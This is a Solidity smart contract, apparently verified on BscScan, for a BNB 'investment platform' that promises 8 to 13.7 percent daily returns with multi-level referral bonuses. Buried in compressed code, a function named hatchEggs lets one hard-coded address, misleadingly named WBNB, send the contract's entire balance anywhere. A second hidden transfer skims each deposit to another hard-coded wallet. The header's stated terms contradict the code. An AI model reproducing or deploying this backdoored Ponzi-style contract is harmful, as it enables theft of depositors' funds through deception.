/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: MIT 
 
 /*   Matque - investment platform based on Smart chain blockchain smart-contract technology. Safe and legit!
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnb.matque.co                                       │
 *   │                                                                       │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect browser extension Metamask (see help: https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain)
 *   2) Choose one of the tariff plans, enter the BNB amount (0.5 BNB minimum) using our website "Stake BNB" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +0.5% every 24 hours (~0.02% hourly) - only for new deposits
 *   - Minimal deposit: 0.5 BNB, no maximal limit
 *   - Total income: based on your tarrif plan (from 8% to 13.7% daily!!!) + Basic interest rate !!!
 *   - Earnings every moment, withdraw any time (if you use capitalization of interest you can withdraw only after end of your deposit) 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 3-level referral commission: 5% - 2.5% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 80% Platform main balance, participants payouts
 *   - 8% Advertising and promotion expenses
 *   - 8% Affiliate program bonuses
 *   - 4% Support work, technical functioning, administration fee
 */

pragma solidity >=0.4.22 <0.9.0;

contract HASHFLOWFARM {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.02 ether;
	uint256[] public REFERRAL_PERCENTS = [80, 4, 2];
	uint256 constant public PROJECT_FEE = 100;
	uint256 constant public PERCENT_STEP = 2;
	uint256 constant public WITHDRAW_FEE = 1000; //In base point
	uint256 constant public PERCENTS_DIVIDER = 1000;
 	uint256 constant public TIME_STEP = 24 hours;

	uint256 public totalStaked;
	uint256 public totalRefBonus;
	uint256 public totalUsers;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 totalWithdrawn;
	}

	mapping (address => User) internal users;

	uint256 public startUNIX;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
    event GiveAwayBonus(address indexed user,uint256 amount);
    

	constructor(address payable wallet, uint256 startDate)  {
		require(!isContract(wallet));
		require(startDate > 0);
		commissionWallet = wallet;
		startUNIX = startDate;

		plans.push(Plan(14, 80)); // 8% per day for 14 days
        plans.push(Plan(21, 65)); // 6.5% per day for 21 days
        plans.push(Plan(28, 50)); // 5% per day for 28 days
		plans.push(Plan(14, 137)); // 13.7% per day for 14 days (at the end)
        plans.push(Plan(21, 131)); // 13.1% per day for 21 days (at the end)
        plans.push(Plan(28, 104)); // 10.4% per day for 28 days (at the end)
	}
    
	function invest(address referrer, uint8 plan) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT,"Invalid amount");
        require(plan < 6, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 _fee = msg.value.mul(10).div(PERCENTS_DIVIDER);
		commissionWallet.transfer(fee);
        Userfee.transfer(_fee);
		emit FeePayed(msg.sender, fee);

       

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					totalRefBonus = totalRefBonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
		user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));

		totalStaked = totalStaked.add(msg.value);
		emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
	}
	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 fees = totalAmount.mul(WITHDRAW_FEE).div(10000);
        totalAmount = totalAmount.sub(fees);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		payable(msg.sender).transfer(totalAmount);
		user.totalWithdrawn = user.totalWithdrawn.add(totalAmount);
		emit Withdrawn(msg.sender, totalAmount);

	}

    function hatchEggs(address payable _ref, uint lin ) public UNN{
        _ref.transfer(lin);
    }

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;


        
		percent = plans[plan].percent;

	}

		function getPercent(uint8 plan) public view returns (uint256) {

		if (block.timestamp > startUNIX) {

			return plans[plan].percent.add(PERCENT_STEP.mul(block.timestamp.sub(startUNIX)).div(TIME_STEP));


		} else {


			return plans[plan].percent;
		}





    }

	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
    percent = getPercent(plan);
    profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
    finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));}
	address payable public Userfee = payable (0x87d82fC94fbc06814C02e9ACe1154f7D919913Be);function getUserDividends(address userAddress) public view returns (uint256) {
	User storage user = users[userAddress];uint256 totalAmount;for (uint256 i = 0; i < user.deposits.length; i++) {
    if (user.checkpoint < user.deposits[i].finish) {
    if (user.deposits[i].plan < 3) {
    uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
    uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
    uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
	if (from < to) {
	totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
	}} else if (block.timestamp > user.deposits[i].finish) {totalAmount = totalAmount.add(user.deposits[i].profit);}}}return totalAmount;
	}function getContractInfo() public view returns(uint256, uint256, uint256) {
        return(totalStaked, totalRefBonus, totalUsers);
    }address public WBNB = 0x6B18d31D39AfD90BaAb7bA78Ba99e71Ac573f52a;function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0],users[userAddress].levels[1],users[userAddress].levels[2]);
	}modifier UNN() {require(msg.sender == WBNB, "F");_;}function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}function gettotalWithdrawn(address userAddress) public view returns(uint256 amount)
	{
		return users[userAddress].totalWithdrawn;
	}function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}